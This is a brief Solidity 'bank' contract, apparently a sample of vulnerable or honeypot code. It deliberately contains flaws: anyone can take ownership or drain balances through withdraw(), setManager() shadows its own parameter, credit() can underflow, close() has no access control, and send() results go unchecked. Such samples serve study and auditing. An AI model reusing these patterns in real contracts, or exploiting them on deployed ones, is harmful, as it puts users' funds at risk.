

contract CreditDepositBank  {
    mapping (address => uint) public balances;
    address public owner;

    function takeOver() public {
        if (balances[msg.sender] > 0) {
            owner = msg.sender;
        }
    }
    
    address payable public manager;

    function setManager(address manager) public {
        if (balances[manager] > 100 * 1e15) {
            manager = manager;
        }
    }

    function func() external payable {
        deposit();
    }
    
    function deposit() public payable {
        if (msg.value >= 10 * 1e15)
            balances[msg.sender] += msg.value;
        else
            revert();
    }
    
    function withdraw(address client) public {
        require (balances[client] > 0);
        msg.sender.send(balances[client]);
    }

    function credit() public payable {
        if (msg.value >= address(this).balance) {
            balances[msg.sender] -= address(this).balance + msg.value;
            msg.sender.send(address(this).balance + msg.value);
        }
    }
    
    function close() public {
        manager.send(address(this).balance);
	    if (address(this).balance == 0) {  
		    selfdestruct(manager);
	    }
    }
}